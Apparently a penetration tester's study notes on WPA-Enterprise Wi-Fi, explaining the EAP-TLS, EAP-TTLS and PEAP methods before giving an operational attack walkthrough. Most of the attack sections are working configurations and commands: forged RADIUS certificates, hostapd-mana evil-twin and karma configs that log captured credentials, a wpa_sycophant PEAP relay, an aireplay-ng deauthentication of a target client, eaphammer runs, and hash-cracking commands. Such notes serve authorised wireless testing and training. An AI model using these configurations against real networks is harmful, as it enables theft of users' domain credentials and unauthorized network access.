### WPA enterprise
Each user uses his own user and password (if client certificates are not used). Each user's traffic is encrypted with a different key. Connection in windows:
![[Pasted image 20220705161948.png]]
and in mac
![[Pasted image 20220705162006.png]]

Looks like a captive portal but it's safer. In WPA enterprise we attack the clients, not the AP nor the RADIUS 

Companies usually create their own CA to validate their certificates and make our forged certificates fail. For that they need to install a company certificate in every client


EAP-TTLS -> server authenicates with certificate. Client can optionally use certificate. There are versions EAP-TTLSv0 and EAP-TTLSv1. Inner auth methods: PAP, CHAP, MSCHAP, MSCHAPv2

PEAP vs TTLS: 
	EAP-TTLS has option to use client side certificate
	EAP-TTLS-PAP support (cleartext passord)
	EAP-PEAP is a wrapper around EAP carring the EAP for authenication
	TTLS is a wrapper around TLVs (type length values), which are RADIUS attributes


The server gives to the client a certificate, to make sure that the client sends credentials to a trusted server


### EAP
WPA-Enterprise, authentication via a RADIUS server, not on the AP

We can host a RADIUS server with freeradius to handle authentication and hostap with custom certificates to create en evil twin of a WPA-Enterprise network


### EAP (RADIUS)
WPA Enterprise uses Extensible Authentication Protocol (EAP). EAP is a framework for authentication, which allows a number of different authentication schemes or methods.

Authentication is done using a Remote Authentication Dial-In User Service (RADIUS) server. The client authenticates using a number of EAP frames, depending on the agreed upon authentication scheme, which are relayed by the AP to the RADIUS server. If authentication is successful, the result is then used as Pairwise Master Key (PMK) for the 4-way handshake, as opposed to PSK, where the passphrase is derived to generate the PMK.

Authentication to a RADIUS server with most common EAP methods, requires the use of certificates on the server side at the very least. Some older, now deprecated EAP methods don't require certificates. Although a number of authentication schemes are possible, just some of them are commonly used, due to their security, and integration with existing OS. It is common to use a username and password to authenticate, which could be tied to domain credentials.

We'll go over a few EAPs commonly used on Wi-Fi networks.

#### EAP-TLS
EAP Transport Layer Security (EAP-TLS) is one of the most secure authentication methods, as it uses certificates on the server side and client side, instead of login and passwords, so the client and server mutually authenticate each other.

#### EAP-TTLS
EAP Tunneled Transport Layer Security (EAP-TTLS), as the name suggests, also uses TLS. As opposed to EAP-TLS, it does not necessarily need client certificates. It creates a tunnel and then exchanges the credentials using one of the few possible different inner methods (also called **phase 2**), such as Challenge-Handshake Authentication Protocol (CHAP), Authentication Protocol (PAP), Microsoft CHAP (MS-CHAP), or MS-CHAPv2.

#### PEAP (MS-CHAPv2 and others)
Similarly to EAP-TTLS, Protected Extensible Authentication Protocol (PEAP) also creates a TLS tunnel before credentials are exchanged. Although different methods can be used within PEAP, MS-CHAPv2 is a commonly used inner method.

PEAP and EAP-TLS mostly differ on how the data is exchanged inside the TLS tunnel.

PEAP hashes are of the type netNTLMv1, that can be cracked with  -m 5500 in hashcat

### Attack
The attack against WPA Enterprise consists in setting up a fake Access Point that imitates the target Access Point, so that clients connect to ours and in the process we capture hashes of their passwords, that can be cracked.

### Optional: imitating the server certificates
While it usually is not necessary, we will create a certificate similar to the one from the RADIUS server that the AP serves to its clients.

<font color=red>if no certificates are captured when the client reauthenticates, deauthenticate him again</font>

We can check the validity by using ``openssl x509 -in CERT_FILENAME -noout -enddate`` where **CERT_FILENAME** is the .pem or .crt file. 

We can now disable monitor mode 

wireshark filter for packets with certificate: ``tls.handshake.certificate``  [[8 - wireshark#Tshark]] 


With wireshark -> Packet Details > Extensible Authentication Protocol > Transport Layer Security > TLSv1 Record Layer: Handshake Protocol: Certificate > Handshake Protocol: Certificate > Certificates > Certificate. For each of them, right click > Export Packet Bytes. Alternatively, check with [[8 - wireshark#Tshark]]

install freeradius

```
sudo apt install freeradius
```

Modify in folder /etc/freeradius/3.0/certs the files ca.cnf (certificate_authority section) and server.cnf (server section).

Run the following to regenerate diffie hellman with a 2048 bit key and create the certificates

```
# in /etc/freeradius/3.0/certs folder:
rm dh
make
```


The client error during the make command can be ignored, it's not necessary to create client certificates to get their hashes when they connect to us. 

Run the command ``make destroycerts`` if you had previously created certificates, to start anew

If you don't have it, install hostapd-mana to create the fake Access Point:
``sudo apt install hostapd-mana``

Also create the file `/etc/hostapd-mana/mana.eap_user`. Add the following contents to increase the chances of clients being able to connect to our fake AP

```
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```


### hostapd-mana for wpa-enterprise
TIPS:
- For testing you may need to change your client settings and turn off and on the wifi, while hostapd-mana remains running all the time, capturing creentials when connection attempts happen, and only if the configuration of the client is the right one for hostapd-mana to get hashes or credentials (EAP connections). at times hostapd-mana may behave strangely after many failed connections, just rerun it, but remember that most of the tweaking happens on the client when messing with the configuration, or if we want to generate traffic, just keep hostapd-mana running and turn off and on wifi on the client after changing the config.
- The channel doesn't matter, but if we use the same as the original it's easier to monitor both networks at once with airodump
- Disable monitor mode to host an AP with hostapd-mana
- If we don't clone the BSSID the channel we use doesn't matter, but if we clone it, we must use a different channel to avoid errors
- mana adds functions that hostapd doesn't have

#### Options in the configuration files of hostapd-mana
- mana_wpe=1 -> to sniff credentials
- mana_eapsuccess=1 -> To let the victim know that he was successful when connecting to us
- mana_credout=``<file>`` -> Saves creds to a file
- eap_server=1 -> Use the internal EAP server, not an external one
- enable_mana=1 -> karma attack, respond to every client that tries to connect to us, making him believe that we are the SSID that he is probing

```
interface=wlan1
ssid=<ESSID>
hw_mode=g
channel=6
auth_algs=3
wpa=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
ieee8021x=1
eap_server=1
eap_user_file=hostapd.eap_user
ca_cert=/root/certs/ca.pem
server_cert=/root/certs/server.pem
private_key=/root/certs/server.key
dh_file=/root/certs/dhparam.pem
mana_wpe=1
mana_eapsuccess=1
mana_credout=hostapd.creds
```


host evil twin with
``hostapd_mana mana.conf``


#### Attack PEAP-GTC

```
interface=wlan1
ssid=<target ESSID>
channel=6
hw_mode=g
wpa=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
auth_algs=3
ieee8021x=1
eapol_key_index_workaround=0
eap_server=1
eap_user_file=hostapd.eap_user
ca_cert=/root/certs/ca.pem
server_cert=/root/certs/server.pem
private_key=/root/certs/server.key
private_key_passwd=
dh_file=/root/certs/dhparam.pem
mana_wpe=1
mana_eapsuccess=1
```

karma attack-> So that many clients can connect to us simultaneously
```
interface=wlan1
ssid=<target ESSID>
channel=6
hw_mode=g
wpa=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
auth_algs=3
ieee8021x=1
eap_server=1
eap_user_file=hostapd.eap_user
ca_cert=/root/certs/ca.pem
server_cert=/root/certs/server.pem
private_key=/root/certs/server.key
dh_file=/root/certs/dhparam.pem
mana_wpe=1
mana_eapsuccess=1
enable_mana=1
mana_credout=hostapd.creds
```

hostapd-mana returns strings to crack WPA-EAP in the following formats
	- asleap
	- john
	- hashcat
I have found that sometimes one tool isn't able to crack it and other is (WTF?) so if one doesn't find the password try with other and the same dictionary

### PEAP relay attack
More info:
https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/
https://www.youtube.com/watch?v=3FSLM1VY0SQ
https://www.youtube.com/watch?v=XYgBw8mx9Jw

3 interfaces are needed:
- wlan0 for hostapd-mana
- wlan1 for sycophant
- wlan2 recon and for deauthenticating clients

#### wlan0
file for hostapd-mana:
```
interface=wlan0
ssid=<target ESSID>
channel=6
hw_mode=g
wpa=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
auth_algs=3
ieee8021x=1
eapol_key_index_workaround=0
eap_server=1
eap_user_file=hostapd.eap_user
ca_cert=/root/certs/ca.pem
server_cert=/root/certs/server.pem
private_key=/root/certs/server.key
private_key_passwd=
dh_file=/root/certs/dhparam.pem
mana_wpe=1
mana_eapsuccess=1
enable_mana=1
enable_sycophant=1
sycophant_dir=/tmp/
```


Run hostapd:
``hostapd-mana ap.conf``

#### wlan1
sycophant configuration file:
```
network={
ssid="<target ESSID>"
# The SSID you would like to relay and authenticate against.
scan_ssid=1
key_mgmt=WPA-EAP
# Do not modify
identity=""
anonymous_identity=""
password=""
# This initialises the variables for me.
# -------------
eap=PEAP
phase1="crypto_binding=0 peaplabel=0"
phase2="auth=MSCHAPV2"
# Dont want to connect back to ourselves,
# so add your rogue BSSID here.
bssid_blacklist=<hostapd-mana MAC>
}
```
In the last line we use the MAC of the interface with hostapd-mana (wlan0 in this case)

Run with
``./wpa_sycophant.sh -c wpa_sycophant_example.conf -i wlan1``

#### wlan2
Deauth a client connected to the target network so that it (hopefully) connects to our rogue AP, which will relay traffic to sycophant
``aireplay-ng -0 4 -a <target BSSID> -c <target client MAC> wlan2``

We should see the connection in sycophant if everything goes well, and then in wlan2 we can do the following to get an IP
``dhclient -v wlan1``


### EAPhammer:
Tool to create fake APs
```bash
./eaphammer -i wlan1 --channel 6 --auth wpa-eap --essid DefenseConference --creds

# karma attack, make every client believe that we are the AP(s) that he is probing. The difference between karma attack and evil twin is that karma uses the probe requests sent by clients (from their preferred network list, PNL) and in evil twin we must guess the APs they want to connect to
./eaphammer -i wlan1 --channel 6 --auth wpa-eap --essid DefenseConference --creds --karma
```


### EAP MD5 crack
``./eapmd5pass -w dict -r eapmd5-sample.dump``
